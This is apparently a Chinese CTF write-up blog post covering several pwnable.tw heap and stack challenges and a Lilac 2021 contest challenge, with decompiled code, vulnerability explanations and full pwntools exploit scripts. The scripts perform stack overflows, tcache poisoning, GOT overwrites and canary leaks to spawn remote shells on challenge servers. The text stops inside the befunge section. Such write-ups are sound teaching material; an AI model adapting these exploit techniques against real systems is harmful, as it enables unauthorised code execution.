# Challenges 100 Week 10



# Challenges_100-Week_10

|          Challenges           |             Tricks              |
| :---------------------------: | :-----------------------------: |
|    pwnble.tw-silver_bullet    |        `stack overflow`         |
|     pwnable.tw-applestore     |         `UAF in stack`          |
|      pwnable.tw-Re-alloc      |    `UAF`+`tcache poisoning`     |
|    pwnable.tw-Tcache Tear     |       `tcache poisoning`        |
| Lilac 2021 五一欢乐赛-babyFAT |           `数组超界`            |
| Lilac 2021 五一欢乐赛-befunge |           `数组超界`            |
| Lilac 2021 五一欢乐赛-noleak  | `house_of_roman`+`IO_file leak` |

<!--more-->

# silver_bullet

## checksec

```shell
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
## IDA

**create**
```c
int __cdecl create_bullet(char *s)
{
  size_t v2; // [esp+0h] [ebp-4h]

  if ( *s )
    return puts("You have been created the Bullet !");
  printf("Give me your description of bullet :");
  read_input(s, 0x30u);
  v2 = strlen(s);
  printf("Your power is : %u\n", v2);
  *((_DWORD *)s + 12) = v2;
  return puts("Good luck !!");
}
```
**power_up**
```c
int __cdecl power_up(char *dest)
{
  char s[48]; // [esp+0h] [ebp-34h] BYREF
  size_t v3; // [esp+30h] [ebp-4h]

  v3 = 0;
  memset(s, 0, sizeof(s));
  if ( !*dest )
    return puts("You need create the bullet first !");
  if ( *((_DWORD *)dest + 12) > 0x2Fu )
    return puts("You can't power up any more !");
  printf("Give me your another description of bullet :");
  read_input(s, 48 - *((_DWORD *)dest + 12));
  strncat(dest, s, 48 - *((_DWORD *)dest + 12));
  v3 = strlen(s) + *((_DWORD *)dest + 12);
  printf("Your new power is : %u\n", v3);
  *((_DWORD *)dest + 12) = v3;
  return puts("Enjoy it !");
}
```
我尝试运行程序，输入几个垃圾数据，发现在`power_up`中，能覆盖长度，从而得到一个很大的数，从而在beat中正常退出程序执行ROP。
所以漏洞点在`power_up`中。这里在`strncat`在拼接字符串后，会在最后加”\\x00“进行截断，可以覆盖大小，产生栈溢出。

## exp
```python 
from pwn import *
from LibcSearcher import LibcSearcher

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name,hex(addr)))
context.log_level="DEBUG"
context.arch="amd64"

local=0
binary='./silver_bullet'
#gdb.attach(p)
if local:
	p=process(binary)
else:
	p=remote('chall.pwnable.tw',10103)

elf = ELF(binary,checksec=False)
libc = ELF('./libc_32.so.6',checksec=False)

puts_plt = elf.plt['puts']
read_got = elf.got['read']
#gdb.attach(p)
one = [0x3a819, 0x5f065, 0x5f066]

#create
p.sendlineafter('Your choice :',"1")
payload='a'*47
p.sendlineafter('Give me your description of bullet :',payload)

#power up
p.sendlineafter('Your choice :',"2")
payload='a'
p.sendlineafter('Give me your another description of bullet :',payload)

p.sendlineafter('Your choice :',"2")
payload='\xff'*7+p32(puts_plt)+p32(0x8048954)+p32(read_got)
p.sendlineafter('Give me your another description of bullet :',payload)

p.sendlineafter('Your choice :',"3")
read_addr = u32(p.recvuntil('\xf7')[-4:])
leak('read',read_addr)
libcbase= read_addr-libc.sym['read']
one_gedget = libcbase+one[0]

p.sendlineafter('Your choice :',"1")
payload='a'*47
p.sendlineafter('Give me your description of bullet :',payload)

#power up
p.sendlineafter('Your choice :',"2")
payload='a'
p.sendlineafter('Give me your another description of bullet :',payload)

p.sendlineafter('Your choice :',"2")
payload='\xff'*7+p32(one_gedget)
p.sendlineafter('Give me your another description of bullet :',payload)
p.sendlineafter('Your choice :',"3")

p.interactive()
```

# pwnable.tw-applestore

## checksec

```shell
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

## IDA

**handler**

```c
unsigned int handler()
{
  char nptr[22]; // [esp+16h] [ebp-22h] BYREF
  unsigned int v2; // [esp+2Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  while ( 1 )
  {
    printf("> ");
    fflush(stdout);
    my_read(nptr, 0x15u);
    switch ( atoi(nptr) )
    {
      case 1:
        list();//列出商品菜单，useless
        break;
      case 2:
        add();//向链表中添加一个商品
        break;
      case 3:
        delete();//从链表中删除一个商品
        break;
      case 4:
        cart();//列出链表中所有的商品
        break;
      case 5:
        checkout();
        break;
      case 6:
        puts("Thank You for Your Purchase!");
        return __readgsdword(0x14u) ^ v2;
      default:
        puts("It's not a choice! Idiot.");
        break;
    }
  }
}
```

**add**

```c
unsigned int add()
{
  const char **v1; // [esp+1Ch] [ebp-2Ch]
  char nptr[22]; // [esp+26h] [ebp-22h] BYREF
  unsigned int v3; // [esp+3Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Device Number> ");
  fflush(stdout);
  my_read(nptr, 0x15u);
  switch ( atoi(nptr) )
  {
    case 1:
      v1 = (const char **)create("iPhone 6", 199);
      insert(v1);
      goto LABEL_8;
    case 2:
      v1 = (const char **)create("iPhone 6 Plus", 299);
      insert(v1);
      goto LABEL_8;
    case 3:
      v1 = (const char **)create("iPad Air 2", 499);
      insert(v1);
      goto LABEL_8;
    case 4:
      v1 = (const char **)create("iPad Mini 3", 399);
      insert(v1);
      goto LABEL_8;
    case 5:
      v1 = (const char **)create("iPod Touch", 199);
      insert(v1);
LABEL_8:
      printf("You've put *%s* in your shopping cart.\n", *v1);
      puts("Brilliant! That's an amazing idea.");
      break;
    default:
      puts("Stop doing that. Idiot!");
      break;
  }
  return __readgsdword(0x14u) ^ v3;
}
```

**create**

```c
char **__cdecl create(const char *a1, char *a2)
{
  char **v3; // [esp+1Ch] [ebp-Ch]

  v3 = (char **)malloc(0x10u);
  v3[1] = a2;
  asprintf(v3, "%s", a1);
  v3[2] = 0;
  v3[3] = 0;
  return v3;
}
```

申请了0x10大小的空间，使用`asprintf`申请商品名称所占用大小的内存空间，并返回指针。`asprintf`所申请的内存空间需要手动释放。在32位程序下，一个指针占4字节，紧接着的四个字节放入了商品的价格，`int`类型也是四个字节，其余的0x8字节都置位0。

**insert**

```c
int __cdecl insert(int a1)
{
  int result; // eax
  _DWORD *i; // [esp+Ch] [ebp-4h]

  for ( i = &myCart; i[2]; i = (_DWORD *)i[2] )
    ;
  i[2] = a1;
  result = a1;
  *(_DWORD *)(a1 + 12) = i;
  return result;
}
```

0x10的空间在`create`的时候只使用了0x8，在`insert`中，首先是一个循环，这个循环是用来遍历链表的。在初始时，`myCart`为空，直接跳出了循环，之后在其+8的位置放入了将插入的商品的地址，又在商品内存的+12的位置插入了`myCart`的地址。

到这里就很清晰了，程序使用了一个双向链表来管理商品，其内存布局如下：

```c
|chunk head	|
|name_addr	|	+0
|price		|	+4
|fd			|	+8
|bk			|	+12
```

**delete**

```c
unsigned int delete()
{
  int v1; // [esp+10h] [ebp-38h]
  int v2; // [esp+14h] [ebp-34h]
  int v3; // [esp+18h] [ebp-30h]
  int v4; // [esp+1Ch] [ebp-2Ch]
  int v5; // [esp+20h] [ebp-28h]
  char nptr[22]; // [esp+26h] [ebp-22h] BYREF
  unsigned int v7; // [esp+3Ch] [ebp-Ch]

  v7 = __readgsdword(0x14u);
  v1 = 1;
  v2 = dword_804B070;
  printf("Item Number> ");
  fflush(stdout);
  my_read(nptr, 0x15u);
  v3 = atoi(nptr);
  while ( v2 )
  {
    if ( v1 == v3 )
    {
      v4 = *(_DWORD *)(v2 + 8);
      v5 = *(_DWORD *)(v2 + 12);
      if ( v5 )
        *(_DWORD *)(v5 + 8) = v4;
      if ( v4 )
        *(_DWORD *)(v4 + 12) = v5;
      printf("Remove %d:%s from your shopping cart.\n", v1, *(const char **)v2);
      return __readgsdword(0x14u) ^ v7;
    }
    ++v1;
    v2 = *(_DWORD *)(v2 + 8);
  }
  return __readgsdword(0x14u) ^ v7;
}
```

删除函数，根据商品的序号将商品从链表中删除，指针的更新也很简单：

```c
fd->bk = p->bk;
bk->fd = p->fd;
```

**checkout**

```c
unsigned int checkout(){  int v1; // [esp+10h] [ebp-28h]  char *v2[5]; // [esp+18h] [ebp-20h] BYREF  unsigned int v3; // [esp+2Ch] [ebp-Ch]  v3 = __readgsdword(0x14u);  v1 = cart();  if ( v1 == 7174 )  {    puts("*: iPhone 8 - $1");    asprintf(v2, "%s", "iPhone 8");    v2[1] = (char *)1;		//v2 is in the stack !!!    insert((int)v2);    v1 = 7175;  }  printf("Total: $%d\n", v1);  puts("Want to checkout? Maybe next time!");  return __readgsdword(0x14u) ^ v3;}
```

当商品的总价格为7174时，就会将`iPhone 8`加入链表。

这里注意`iPhone 8`的内存空间是在栈上的！`v2`变量在`ebp-0x20`的位置，这点很重要。

我们知道，在调用函数时，调用者会将被调函数的参数压栈，之后保存栈底的位置，即`ebp`。在被调函数返回时，并没有对栈进行清空，只是恢复了栈的位置。而其他被调函数还有可能会使用栈上的这个数据。那么如果我们通过一些手段修改了这个数据，就可能造成攻击，看`headler`的函数调用。

```assembly
.text:08048C33 loc_8048C33:                            ; CODE XREF: handler+5E↑j.text:08048C33                                         ; DATA XREF: .rodata:jpt_8048C31↓o.text:08048C33                 call    list            ; jumptable 08048C31 case 1.text:08048C38                 jmp     short loc_8048C63.text:08048C3A ; ---------------------------------------------------------------------------.text:08048C3A.text:08048C3A loc_8048C3A:                            ; CODE XREF: handler+5E↑j.text:08048C3A                                         ; DATA XREF: .rodata:jpt_8048C31↓o.text:08048C3A                 call    add             ; jumptable 08048C31 case 2.text:08048C3F                 jmp     short loc_8048C63.text:08048C41 ; ---------------------------------------------------------------------------.text:08048C41.text:08048C41 loc_8048C41:                            ; CODE XREF: handler+5E↑j.text:08048C41                                         ; DATA XREF: .rodata:jpt_8048C31↓o.text:08048C41                 call    delete          ; jumptable 08048C31 case 3.text:08048C46                 jmp     short loc_8048C63.text:08048C48 ; ---------------------------------------------------------------------------.text:08048C48.text:08048C48 loc_8048C48:                            ; CODE XREF: handler+5E↑j.text:08048C48                                         ; DATA XREF: .rodata:jpt_8048C31↓o.text:08048C48                 call    cart            ; jumptable 08048C31 case 4.text:08048C4D                 jmp     short loc_8048C63.text:08048C4F ; ---------------------------------------------------------------------------.text:08048C4F.text:08048C4F loc_8048C4F:                            ; CODE XREF: handler+5E↑j.text:08048C4F                                         ; DATA XREF: .rodata:jpt_8048C31↓o.text:08048C4F                 call    checkout        ; jumptable 08048C31 case 5.text:08048C54                 jmp     short loc_8048C63
```

这里只是一个一个的`call`操作，没有对栈进行其他的处理，所以栈上的`v2`相对于这些函数的`ebp`而言偏移是相同的。

那么我们如何覆写这块内存呢？

请看在这些函数读取操作的时候：

**cart**

```c
int cart()
{
  int v0; // eax
  int v2; // [esp+18h] [ebp-30h]
  int v3; // [esp+1Ch] [ebp-2Ch]
  int i; // [esp+20h] [ebp-28h]
  char buf[22]; // [esp+26h] [ebp-22h] BYREF
  unsigned int v6; // [esp+3Ch] [ebp-Ch]

  v6 = __readgsdword(0x14u);
  v2 = 1;
  v3 = 0;
  printf("Let me check your cart. ok? (y/n) > ");
  fflush(stdout);
  my_read(buf, 0x15u);
  if ( buf[0] == 121 )
  {
    puts("==== Cart ====");
    for ( i = dword_804B070; i; i = *(_DWORD *)(i + 8) )
    {
      v0 = v2++;
      printf("%d: %s - $%d\n", v0, *(const char **)i, *(_DWORD *)(i + 4));
      v3 += *(_DWORD *)(i + 4);
    }
  }
  return v3;
}
```

这里`buf`距离`ebp`0x22字节，`iPhone 8`字符串在`ebp-20`的位置，而`buf`允许写入0x15字节，到这里你应该就想到如何覆写了。我们在前两个字节写入选项，在后面覆写构造`iPhone 8`的内存结构。

首先，我们将字符串地址覆写为某got表地址，那么调用`cart`就可以leak libc。在遍历链表的时候只根据`fd`指针，所以我们将fd覆写为`myCart+8`的地址就可以再次泄露heap地址，而heap上其实是保存着栈的地址的。也可以通过使用libc中的environ进行泄露。

接着，我们可以通过`delete`来实现任意地址写。这里有一个问题，got表地址被写入后，会被当作商品的指针，而实际上got表指向的是代码段，这个段是不可写的！所以，我们无法通过简单的填写指针来进行got表劫持。

这里，我们通过劫持`delete`的ebp，在函数中，局部变量的寻址一般是通过`ebp-offset`实现的，所以，我们通过劫持`ebp`到got表，在输入变量的时候就可以对got表进行覆写。

接着我们要做的就是覆写劫持`delete`的ebp，写入`atoi_got+0x22`。因为允许我们输入的变量相对于`ebp`的偏移为0x22。参考上面`delete`的等价操作，只要简单的覆写`fd`和`bk`即可。

## exp

```python
from pwn import *
from LibcSearcher import LibcSearcher
from struct import pack
import sys

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="amd64"
context.terminal = ['tmux', 'splitw', '-h']

binary='./applestore'
#gdb.attach(sh)
if 'g' in sys.argv[1]:
	context.log_level="DEBUG"
if 'l' in sys.argv[1] and 'r' not in sys.argv[1]:
	log.info('Test in local...')
	sh=process(binary)
if 'r' in sys.argv[1]:
	log.info('Attacking...')
	sh=remote('chall.pwnable.tw',10104)

elf = ELF(binary,checksec=False)
#libc = ELF('',checksec=False)
puts_got = elf.got['puts']
atoi_got = elf.got['atoi']
mycart = 0x804B068
add = '2';delete='3';cart='4';checkout='5'

def do(choice,payload):
	sh.sendlineafter('> ',choice)
	sh.sendlineafter('>',payload)

for i in range(6):
	do(add,b'1')
for i in range(20):
	do(add,b'2')

do(checkout,b'y') #add iphone-8

payload= b'y\x00'+p32(puts_got)+p32(0x1)+p32(mycart+8)+p32(1)
do(cart,payload)
sh.recvuntil('27: ')
puts_addr=u32(sh.recv(4))
sh.recvuntil('28: ')
heap_addr = u32(sh.recv(4))
leak('puts addr',puts_addr)
leak('heap addr',heap_addr)
libc = LibcSearcher('puts',puts_addr)
libcbase = puts_addr - libc.dump('puts')
leak('libc base',libcbase)
system = libcbase+libc.dump('system')

env = libcbase+libc.dump('environ')
payload= b'y\x00'+p32(env)+p32(0x1)+p32(mycart+8)+p32(1)
do(cart,payload)
sh.recvuntil('27: ')
stack =u32(sh.recv(4))
leak('stack',stack)

payload = b'27'+p32(env)+p32(0x1)+p32(atoi_got+0x22)+p32(stack - 0x100 - 0xc)

do(delete,payload)

sh.sendlineafter('> ',p32(system)+b';/bin/sh')

sh.interactive()
```

# pwnable.tw-Re-alloc

## checksec 

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```

## IDA

**add**

```c
int allocate()
{
  _BYTE *v0; // rax
  unsigned __int64 v2; // [rsp+0h] [rbp-20h]
  unsigned __int64 size; // [rsp+8h] [rbp-18h]
  void *v4; // [rsp+18h] [rbp-8h]

  printf("Index:");
  v2 = read_long();
  if ( v2 > 1 || heap[v2] )
  {
    LODWORD(v0) = puts("Invalid !");
  }
  else
  {
    printf("Size:");
    size = read_long();
    if ( size <= 0x78 )
    {
      v4 = realloc(0LL, size);
      if ( v4 )
      {
        heap[v2] = v4;
        printf("Data:");
        v0 = (_BYTE *)(heap[v2] + read_input(heap[v2], (unsigned int)size));
        *v0 = 0;
      }
      else
      {
        LODWORD(v0) = puts("alloc error");
      }
    }
    else
    {
      LODWORD(v0) = puts("Too large!");
    }
  }
  return (int)v0;
}
```

**edit**

```c
int reallocate()
{
  unsigned __int64 v1; // [rsp+8h] [rbp-18h]
  unsigned __int64 size; // [rsp+10h] [rbp-10h]
  void *v3; // [rsp+18h] [rbp-8h]

  printf("Index:");
  v1 = read_long();
  if ( v1 > 1 || !heap[v1] )
    return puts("Invalid !");
  printf("Size:");
  size = read_long();
  if ( size > 0x78 )
    return puts("Too large!");
  v3 = realloc((void *)heap[v1], size);
  if ( !v3 )
    return puts("alloc error");
  heap[v1] = v3;
  printf("Data:");
  return read_input(heap[v1], (unsigned int)size);
}
```

**free**

```c
int rfree()
{
  _QWORD *v0; // rax
  unsigned __int64 v2; // [rsp+8h] [rbp-8h]

  printf("Index:");
  v2 = read_long();
  if ( v2 > 1 )
  {
    LODWORD(v0) = puts("Invalid !");
  }
  else
  {
    realloc((void *)heap[v2], 0LL);
    v0 = heap;
    heap[v2] = 0LL;
  }
  return (int)v0;
}
```

程序的各种功能都是由`realloc`来实现的。`realloc`有两个参数`ptr`与`size`：

- `ptr == NULL`：其与`malloc`**等价**
- `ptr != NULL`:
  - `new size == old size`：直接将`ptr`返回。
  - `new size < old size`：将`ptr`进行分割，剩余部分若大于最小chunk的大小就会被free
  - `new size > old size`：调用`malloc`申请一块新的内存，拷贝数据后将`old ptr`释放
  - `new size == 0`：与`free`**等价**

在`edit`中，若`new size`为0，就相当于对chunk进行了free，free的返回值为0。程序进行了返回，没有将原来的指针进行更新，所以我们可以进行UAF。

got表可写，但是没有show函数，先想办法通过修改got表进行leak。计划修改`atoll_got`为`printf_plt`，我们就可以通过格式化字符串漏洞来泄露got表中的地址，从而leak libc。

首先，申请一个chunk，使用`edit`将其free，并修改其`fd`指向`atoll_got`。然后，再将这个chunk申请回来，这时`next`就会被填入`atoll_got`。为了不影响最开始的这个`tcache bin`，我们`realloc`这个chunk，为一个新大小，然后free掉。这时，这个chunk的key被清空了，但是heap数组中还有这个chunk的指针，而且我么没法直接覆盖，所以我们再次通过`realloc`修改器key域为垃圾数据，将其free就可以清空heap数组了。最后，一个`tcache bin`的`next`不为`NULL`但是count为0，之后再申请对应的大小就会让count造成溢出。

在leak libc后，还要再次进行修改，所以我们再次使用上述操作，使另一个`tcache bin`的`next`指向`atoll_got`。

## exp

```python
from pwn import *
#from LibcSearcher import LibcSearcher
from struct import pack
import sys

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context(arch = 'amd64' , os = 'linux', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

binary='./re-alloc'
#gdb.attach(sh)
if 'l' in sys.argv[1] and 'r' not in sys.argv[1]:
	log.info('Test in local...')
	sh=process(binary)
if 'r' in sys.argv[1]:
	log.info('Attacking...')
	sh=remote('chall.pwnable.tw', 10106)

elf = ELF(binary,checksec=False)
libc = ELF('libc.so',checksec=False)

def add(idx,size,data):
	sh.sendlineafter('choice: ','1')
	sh.sendlineafter('Index:',str(idx))
	sh.sendlineafter('Size:',str(size))
	sh.sendafter('Data:',data)

def edit(idx,size,data):
	sh.sendlineafter('choice: ','2')
	sh.sendlineafter('Index:',str(idx))
	sh.sendlineafter('Size:',str(size))
	if size != 0:
		sh.sendafter('Data:',data)

def dele(idx):
	sh.sendlineafter('choice: ','3')
	sh.sendlineafter('Index:',str(idx))	

atoll_got = elf.got['atoll']
printf_plt = elf.plt['printf']

add(0,0x18,'a'*0x8)
edit(0,0,'')
edit(0,0x18,p64(atoll_got))
add(1,0x18,'a'*0x8)
edit(0,0x38,'a'*8)
dele(0)
edit(1,0x38,'b'*0x10)
dele(1)

add(0,0x48,'a'*0x8)
edit(0,0,'')
edit(0,0x48,p64(atoll_got))
add(1,0x48,'a'*0x8)
edit(0,0x58,'a'*8)
dele(0)
edit(1,0x58,'b'*0x10)
dele(1)

add(0,0x48,p64(printf_plt))
sh.sendlineafter('choice: ','1')
sh.recvuntil("Index:")
sh.sendline('%6$p')
stdout_addr = int(sh.recv(14),16)
libc.address=stdout_addr -libc.sym['_IO_2_1_stdout_']
info("libc: "+hex(libc.address))
sh.sendlineafter('choice: ','1')
sh.recvuntil(":")
sh.sendline('a'+'\x00')
sh.recvuntil(":")
sh.send('a'*15+'\x00')
sh.recvuntil("Data:")
sh.send(p64(libc.sym['system']))

# gdb.attach(p)
sh.sendlineafter('choice: ','3')
sh.recvuntil("Index:")
sh.sendline("/bin/sh\x00")
sh.interactive()

```

由于延迟原因（~~辣鸡校园网~~，建议使用`sh.recvuntil('xxx');sh.send('xxx')`而不是`sendlineafter`。

# pwnable.tw-Tcache Tear

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    FORTIFY:  Enabled
```



## IDA

**add**

```c
int add()
{
  unsigned __int64 v0; // rax
  int size; // [rsp+8h] [rbp-8h]

  printf("Size:");
  v0 = choice();
  size = v0;
  if ( v0 <= 0xFF )
  {
    ptr = malloc(v0);
    printf("Data:");
    my_read((__int64)ptr, size - 16);
    LODWORD(v0) = puts("Done !");
  }
  return v0;
}
```

**main**

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  __int64 v3; // rax
  unsigned int v4; // [rsp+Ch] [rbp-4h]

  Init(a1, a2, a3);
  printf("Name:");
  my_read(&name, 32LL);
  v4 = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      v3 = choice();
      if ( v3 != 2 )
        break;
      if ( v4 <= 7 )
      {
        free(ptr);
        ++v4;
      }
    }
    if ( v3 > 2 )
    {
      if ( v3 == 3 )
      {
        show();
      }
      else
      {
        if ( v3 == 4 )
          exit(0);
LABEL_14:
        puts("Invalid choice");
      }
    }
    else
    {
      if ( v3 != 1 )
        goto LABEL_14;
      add();
    }
  }
}
```

**show**

```c
ssize_t show()
{
  printf("Name :");
  return write(1, &name, 0x20uLL);
}
```

漏洞点有两个地方:

- free后指针未清零，对本题来说可以造成UAF
- 在add函数中，若size<16，则会整数溢出，可写入任意长度数据

got表不可写，同时也没有输出函数，只有将名字进行输出。首先，想办法进行leak，通过uaf，我们可以对任意已知地址的内存进行读写，所以我们将name所在的内存伪造成一个large chunk，将其free，再show就可以leak libc，之后就是简单了。

为了成功将large chunk进行free，我们需要构造三个chunk，看下面的这段代码：

```c
    nextsize = chunksize(nextchunk);
    if (__builtin_expect (chunksize_nomask (nextchunk) <= 2 * SIZE_SZ, 0)
	|| __builtin_expect (nextsize >= av->system_mem, 0))
      malloc_printerr ("free(): invalid next size (normal)");
	···
    if (nextchunk != av->top) {
      /* get and clear inuse bit */
      nextinuse = inuse_bit_at_offset(nextchunk, nextsize);
```

该段代码检查free的chunk的nextchunk大小是否满足要求，还检查了nextchunk的inuse位，这一位在nextchunk的nextchunk中，所以我们要伪造三个chunk。

首先，先将两个nextchunk构造出来，在`name+0x500`的地方伪造通过任意地址读写伪造两个`0x20`的chunk，之后在将name的chunk取出free掉。

## exp

```python
from pwn import *
# from LibcSearcher import LibcSearcher
from struct import pack
import sys

leak = lambda name,addr: log.success('{0} addr ---> {1}'.format(name, hex(addr)))
context.arch="amd64"
context.terminal = ['tmux', 'splitw', '-h']

binary='./tcache_tear'
#gdb.attach(sh)
if 'g' in sys.argv[1]:
	context.log_level="DEBUG"
if 'l' in sys.argv[1] and 'r' not in sys.argv[1]:
	log.info('Test in local...')
	sh=process(binary)
if 'r' in sys.argv[1]:
	log.info('Attacking...')
	sh=remote('chall.pwnable.tw', 10207)

elf = ELF(binary,checksec=False)
libc = ELF('./libc.so',checksec=False)

def add(size,data):
	sh.recvuntil('choice :')
	sh.sendline('1')
	sh.recvuntil('Size:')
	sh.send(str(size))
	sh.recvuntil('Data:')
	sh.send(data)

def free():
	sh.recvuntil('choice :')
	sh.sendline('2')

name = 0x602060
one = [0x4f2c5, 0x4f322,0x10a38c]
sh.sendline(p64(0)+p64(0x501))

add(0x50,'a'*8+'\n') # 0x100
free()
free()

add(0x50,p64(name+0x500))
add(0x50,'aaa')
add(0x50,p64(0)+p64(0x21)+p64(0)*3+p64(0x21)+p64(0)*2)

add(0x60,'aaaa')
free()
free()
add(0x60,p64(name+0x10))
add(0x60,'aaa')
add(0x60,'a')
free()
# gdb.attach(sh)
sh.recvuntil('choice :')
sh.sendline('3')
malloc_hook = u64(sh.recvuntil('\x7f')[-6:].ljust(8,b'\x00')) - 96 - 0x10 
libc.address = malloc_hook - libc.sym['__malloc_hook']
one_gadget = libc.address + one[1]
leak('libc base',libc.address)

add(0x70,'aaaa')
free()
free()
add(0x70,p64(libc.sym['__free_hook']))
add(0x70,'aaa')
add(0x70,p64(one_gadget))
free()

sh.interactive()
```

# Lilac 2021 五一欢乐赛

~~假期没人约~~，没事干又不想写作业只能a题了，去年十一的时候第一次做Lilac的题，5天做出一道（太菜了。这次把题AK了，很开心

<!--more-->

# babyFAT

## checksec

```shell
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```



## IDA

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+7h] [rbp-109h] BYREF
  int v5; // [rsp+8h] [rbp-108h]
  int v6; // [rsp+Ch] [rbp-104h]
  int v7; // [rsp+10h] [rbp-100h]
  int v8; // [rsp+14h] [rbp-FCh]
  int i; // [rsp+18h] [rbp-F8h]
  int v10; // [rsp+1Ch] [rbp-F4h]
  char nptr[16]; // [rsp+20h] [rbp-F0h] BYREF
  char FAT[112]; // [rsp+30h] [rbp-E0h] BYREF
  char string[104]; // [rsp+A0h] [rbp-70h] BYREF
  unsigned __int64 v14; // [rsp+108h] [rbp-8h]

  v14 = __readfsqword(0x28u);
  v6 = 0;
  v7 = v5;
  v10 = 0;
  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  hello();
  do
  {
    print_menu();
    __isoc99_scanf(" %c", &v4);
    if ( v4 == 50 )
    {
      for ( i = v5; ; i = FAT[i] )
      {
        putchar(string[i]);
        if ( i == v7 )
          break;
      }
      puts(&byte_400DD8);
    }
    else if ( v4 > 50 )
    {
      if ( v4 == 51 )
      {
        printf("Index: ");
        __isoc99_scanf("%s", nptr);
        v10 = atoi(nptr);
        if ( v6 )
        {
          for ( i = v5; ; i = FAT[i] )
          {
            if ( i == v10 )
            {
              printf("Input content: ");
              __isoc99_scanf(" %c", &string[v10]);
              puts("Success");
              goto LABEL_27;
            }
            if ( i == v7 )
              break;
          }
          puts("Wrong idx!");
        }
      }
      else if ( v4 == 52 )
      {
        v6 = 0;
        memset(FAT, 0, 0x64uLL);
        memset(string, 0, 0x64uLL);
        puts("Success");
      }
    }
    else if ( v4 == 49 )
    {
      if ( v6 <= 99 )
      {
        printf("Index: ");
        __isoc99_scanf("%s", nptr);
        v10 = (int)abs32(atoi(nptr)) % 100;
        printf("Input content: ");
        if ( v6 )
          FAT[v8] = v10;
        else
          v5 = v10;
        v8 = v10;
        ++v6;
        v7 = v10;
        __isoc99_scanf(" %c", &string[v10]);
      }
      else
      {
        puts("full!");
      }
    }
LABEL_27:
    ;
  }
  while ( v4 != 53 );
  puts("Bye~");
  return 0;
}
```

开启了`canary`保护，还有一个后门。在`write`和`edit`的时候使用的`__isoc99_scanf("%s", nptr);`会造成任意长度溢出，但是并不知道`canary`的值。程序本身是一个`File Allocation Table`，通过`FAT[]`数组寻找下一个字符的下标，例如`FAT[1] = 12`那么1之后就要去找12。这里有一个[很棒的视频](https://www.youtube.com/watch?v=V2Gxqv3bJCk)。

我们可以通过溢出覆盖`FAT[0]`的值为一个较大的数，造成数组超界。我们可以通过这个来leak canary。

## exp

```python
from pwn import *
context.log_level="DEBUG"
p = remote("101.200.201.114",30001)

def write(idx,content):
    p.sendlineafter('choice: ','1')
    p.sendlineafter('Index: ',str(idx))
    p.sendline(str(content))

def show():
    p.sendlineafter('choice: ','2')

def edit(idx,content):
    p.sendlineafter('choice: ','3')
    p.sendlineafter('Index: ',str(idx))
    p.sendline(str(content))

## xx xx xx xx xx xx xx 00
## +6 +5 +4 +3 +2 +1 +0 
write(0,'a')
write(1,'a')
payload = p32(0)*4+p8(0x69)+'\x01'*111
edit(payload,'a')
show()
p.recvuntil('a')
bit_1 = u8(p.recv(1))
print(hex(bit_1))

payload = p32(0)*4+p8(0x69+1)+'\x01'*111
edit(payload,'a')
show()
p.recvuntil('a')
bit_2 = u8(p.recv(1))
print(hex(bit_2))

payload = p32(0)*4+p8(0x69+2)+'\x01'*111
edit(payload,'a')
show()
p.recvuntil('a')
bit_3 = u8(p.recv(1))
print(hex(bit_3))

payload = p32(0)*4+p8(0x69+3)+'\x01'*111
edit(payload,'a')
show()
p.recvuntil('a')
bit_4 = u8(p.recv(1))
print(hex(bit_4))

payload = p32(0)*4+p8(0x69+4)+'\x01'*111
edit(payload,'a')
show()
p.recvuntil('a')
bit_5 = u8(p.recv(1))
print(hex(bit_5))

payload = p32(0)*4+p8(0x69+5)+'\x01'*111
edit(payload,'a')
show()
p.recvuntil('a')
bit_6 = u8(p.recv(1))
print(hex(bit_6))

payload = p32(0)*4+p8(0x69+6)+'\x01'*111
edit(payload,'a')
show()
p.recvuntil('a')
bit_7 = u8(p.recv(1))
print(hex(bit_7))
canary = +p8(0)+p8(bit_1)+p8(bit_2)+p8(bit_3)+p8(bit_4)+p8(bit_5)+p8(bit_6)+p8(bit_7)
payload = "\x00"*(0xf0-8)+canary+p64(0)+p64(0x04008E7)
write(payload,'a')
#gdb.attach(p)
p.sendlineafter('choice: ','5')

p.interactive()
```

# befunge

## checksc

```shell
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    FORTIFY:  Enabled
```

## IDA

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char *v3; // rbp
  unsigned __int64 v4; // rcx
  __int64 i; // rax
  char v6; // di
  char v7; // dl
  __int64 v8; // rdi
  int v9; // eax
  __int64 v10; // r14
  __int64 v11; // rdi
  __int64 v12; // r14
  __int64 v13; // rdi
  __int64 v14; // r14
  __int64 v15; // rdi
  __int64 v16; // r14
  __int64 v17; // rdi
  __int64 v18; // r14
  __int64 v19; // rdi
  __int64 v20; // r14
  __int64 v21; // rax
  __int64 v22; // rax
  __int64 v23; // r14
  __int64 v24; // r15
  __int64 v25; // r14
  __int64 v26; // r14
  __int64 v27; // rax
  __int64 v28; // r15
  __int64 v29; // r14
  int v30; // eax
  int step; // ebx
  int v33; // [rsp+Ch] [rbp-9Ch] BYREF
  char s[80]; // [rsp+10h] [rbp-98h] BYREF
